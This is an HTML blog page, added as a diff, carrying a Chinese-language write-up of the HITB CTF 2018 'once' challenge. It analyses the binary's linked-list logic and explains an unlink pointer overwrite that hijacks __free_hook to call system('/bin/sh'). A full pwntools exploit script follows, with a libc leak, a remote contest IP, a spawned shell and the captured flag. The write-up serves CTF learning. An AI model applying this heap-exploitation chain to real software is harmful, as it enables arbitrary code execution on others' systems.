@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>hitbctf2018-once | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="once基本逻辑once名字的来由大概是很多操作都只能做一次（误） 先执行二进制文件，根据输出的字符串定位各个函数。 f1：程序维护一个双向链表结构，每个结点有四项内容，[2]和[3]分别为上个结点和下个结点的地址，表头是data段的&amp;amp;unk_202020，其中unk_202020[3]为off_202038。新加入的结点插入到头部，用off_202038进行记录。这个逻辑我还是想了一会的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hitbctf2018-once">
+<meta property="og:url" content="http://yoursite.com/2018/06/05/hitbctf2018-once/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="once基本逻辑once名字的来由大概是很多操作都只能做一次（误） 先执行二进制文件，根据输出的字符串定位各个函数。 f1：程序维护一个双向链表结构，每个结点有四项内容，[2]和[3]分别为上个结点和下个结点的地址，表头是data段的&amp;amp;unk_202020，其中unk_202020[3]为off_202038。新加入的结点插入到头部，用off_202038进行记录。这个逻辑我还是想了一会的">
+<meta property="og:image" content="http://yoursite.com/2018/06/05/hitbctf2018-once/f1.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/05/hitbctf2018-once/f2.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/05/hitbctf2018-once/f3.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/05/hitbctf2018-once/f41.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/05/hitbctf2018-once/f42.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/05/hitbctf2018-once/f43.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/05/hitbctf2018-once/1.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/05/hitbctf2018-once/2.png">
+<meta property="og:updated_time" content="2018-06-05T15:32:14.682Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="hitbctf2018-once">
+<meta name="twitter:description" content="once基本逻辑once名字的来由大概是很多操作都只能做一次（误） 先执行二进制文件，根据输出的字符串定位各个函数。 f1：程序维护一个双向链表结构，每个结点有四项内容，[2]和[3]分别为上个结点和下个结点的地址，表头是data段的&amp;amp;unk_202020，其中unk_202020[3]为off_202038。新加入的结点插入到头部，用off_202038进行记录。这个逻辑我还是想了一会的">
+<meta name="twitter:image" content="http://yoursite.com/2018/06/05/hitbctf2018-once/f1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Buscar"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-hitbctf2018-once" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/06/05/hitbctf2018-once/" class="article-date">
+  <time datetime="2018-06-05T15:30:28.000Z" itemprop="datePublished">2018-06-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      hitbctf2018-once
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="once"><a href="#once" class="headerlink" title="once"></a>once</h1><h2 id="基本逻辑"><a href="#基本逻辑" class="headerlink" title="基本逻辑"></a>基本逻辑</h2><p><em>once名字的来由大概是很多操作都只能做一次（误）</em></p>
+<p>先执行二进制文件，根据输出的字符串定位各个函数。</p>
+<p><strong>f1</strong>：程序维护一个双向链表结构，每个结点有四项内容，[2]和[3]分别为上个结点和下个结点的地址，表头是data段的<code>&amp;unk_202020</code>，其中<code>unk_202020[3]</code>为<code>off_202038</code>。新加入的结点插入到头部，用<code>off_202038</code>进行记录。这个逻辑我还是想了一会的，果然要多读源码。</p>
+<p><img src="/2018/06/05/hitbctf2018-once/f1.png" alt="f1函数"></p>
+<p><strong>f2：</strong>在bss段有一个变量<code>dword_202064</code>，作为是否进行了写操作的标志。函数实现了向第一个结点内写入0x20个字节，这个功能仅能实现一次。</p>
+<p><img src="/2018/06/05/hitbctf2018-once/f2.png" alt="f2函数"></p>
+<p><strong>f3：</strong>同样，bss有一个<code>dword_202060</code>变量，标识是否进行了结点删除的操作。函数实现了删除第一个结点。</p>
+<p><img src="/2018/06/05/hitbctf2018-once/f3.png" alt="f3函数"></p>
+<p><strong>f4：</strong>函数里有一些子操作，输入1时，分配size大小的内存空间，并把对应标志置位。</p>
+<p><img src="/2018/06/05/hitbctf2018-once/f41.png" alt="f4-1"></p>
+<p>​    输入2时，向ptr内输入size大小的内容。</p>
+<p><img src="/2018/06/05/hitbctf2018-once/f42.png" alt="f4-2"></p>
+<p>​    输入3时，释放ptr内存。</p>
+<p><img src="/2018/06/05/hitbctf2018-once/f43.png" alt="f4-3"></p>
+<h2 id="漏洞及利用"><a href="#漏洞及利用" class="headerlink" title="漏洞及利用"></a>漏洞及利用</h2><p>在f2里，用户可以输入0x20个字节，能够覆盖掉结点中的前后向指针。并且在f3的解链操作中，对前后向指针进行操作，能够将程序劫持到期待的位置。简称<code>offset_202038</code>为<code>first``,unk_202020</code>为<code>head</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   			<span class="comment">//f2向结点内写内容，覆盖node[3]的地址为addr</span></span><br><span class="line"><span class="comment">//first里记录的是node的地址</span></span><br><span class="line">first = *(first+<span class="number">3</span>)</span><br><span class="line"><span class="comment">//first = addr                        </span></span><br><span class="line">   			*(first+<span class="number">2</span>)=&amp;head</span><br><span class="line">   			<span class="comment">//*(addr+2)=&amp;head</span></span><br></pre></td></tr></table></figure>
+<p>可以看出，最终能够实现向<code>addr+16</code>的地址处写入head地址。由于f4后续可以操作ptr变量，就使得<code>addr+16=&amp;ptr</code>，经过上述过程后，ptr的内容为head地址，那么后面就可以向data段和bss段任意写。</p>
+<p>本题开启了PIE保护，也就是无法直接获取到GOT，BSS变量地址。实际上，二进制文件中的相对位置是不变的。由于.data段与.bss段相邻，且相差较少，可以通过修改最后一个个字节来修改node[3]的内容。<code>addr = &amp;ptr-16 = 0x202058</code>，发送最后一个字节0x58即可。</p>
+<p><img src="/2018/06/05/hitbctf2018-once/1.png" alt=""></p>
+<p><img src="/2018/06/05/hitbctf2018-once/2.png" alt="data段和bss段地址"></p>
+<p>之后f4向ptr写入内容就相当于向<code>unk_202020</code>起始的位置写入内容。由于f2能够向<code>off_202038</code>中的地址写入内容，不妨将offset_202038的值写为 <code>__free_hook</code>的地址，之后调用f2就可以向这里写入<code>system</code>地址。为了再次利用f2函数，应该覆写位于bss中的dword_202064变量。这样，覆写了 <code>__free_hook</code>之后，再次调用free就会执行<code>system</code>，f4中的3调用了<code>free</code>函数，对ptr中地址进行释放，因此可以将ptr中的值覆写为<code>/bin/sh</code>的地址。</p>
+<p>一共要进行三次写操作：</p>
+<p>1.f2向<code>offset_202038</code>中写入24字节填充和1字节0x58覆盖后向指针</p>
+<p>2.f4-2向ptr中写入<code>__free_hook</code>地址、<code>/bin/sh</code>地址和对一些标识位置位。</p>
+<p>3.f2向<code>offset_202038</code>（<code>__free_hook</code>）写入<code>system</code>地址</p>
+<h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./once'</span>)</span><br><span class="line"><span class="comment">#flag&#123;t1-1_1S_0_sImPl3_n0T3&#125;</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p = process(<span class="string">'./once'</span>)</span><br><span class="line">	libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'47.75.189.102'</span>, <span class="number">9999</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun_1</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun_2</span><span class="params">(string)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.sendline(string)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun_3</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Invalid choice\n'</span>)</span><br><span class="line">libc.address = int(p.recvuntil(<span class="string">'&gt;'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#add a node</span></span><br><span class="line">fun_1()</span><br><span class="line"><span class="comment">#f4:ptr=malloc 0xe0</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'size:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0xe0</span>))</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line"><span class="comment">#input node </span></span><br><span class="line">fun_2(<span class="string">'a'</span>*<span class="number">16</span>+<span class="string">'b'</span>*<span class="number">8</span> + chr(<span class="number">0x58</span>))</span><br><span class="line"><span class="comment">#remove node</span></span><br><span class="line">fun_3()</span><br><span class="line"><span class="comment">#write ptr</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.send(<span class="string">'/bin/sh\0'</span>+ <span class="string">'\0'</span>*<span class="number">0x10</span> + p64(libc.symbols[<span class="string">'__free_hook'</span>]) + p64(libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>] )+ p64(<span class="number">0</span>) + p64(libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>]) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(next(libc.search(<span class="string">'/bin/sh'</span>))) +p64(<span class="number">0</span>)*<span class="number">4</span> )</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.send(p64(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] system '</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/06/05/hitbctf2018-once/" data-id="cji1uex0q00016ku6cxbfq12a" class="article-share-link">Compartir</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2018/06/05/fastbin-attack-search/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Viejo</strong>
+      <div class="article-nav-title">fastbin_attack-search</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn-how2heap/">pwn how2heap</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Nube de Tags</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/pwn-how2heap/" style="font-size: 10px;">pwn how2heap</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archivos</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Posts recientes</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2018/06/05/hitbctf2018-once/">hitbctf2018-once</a>
+          </li>
+        
+          <li>
+            <a href="/2018/06/05/fastbin-attack-search/">fastbin_attack-search</a>
+          </li>
+        
+          <li>
+            <a href="/2018/03/13/unsortedbin-attack-0ctf-zerostorage/">unsortedbin_attack--0ctf zerostorage</a>
+          </li>
+        
+          <li>
+            <a href="/2018/03/08/pwnable-tw-silver-bullet/">pwnable.tw-silver_bullet</a>
+          </li>
+        
+          <li>
+            <a href="/2018/03/08/pwnable-tw-hacknote/">pwnable.tw--hacknote</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2018 John Doe<br>
+      Construido por <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
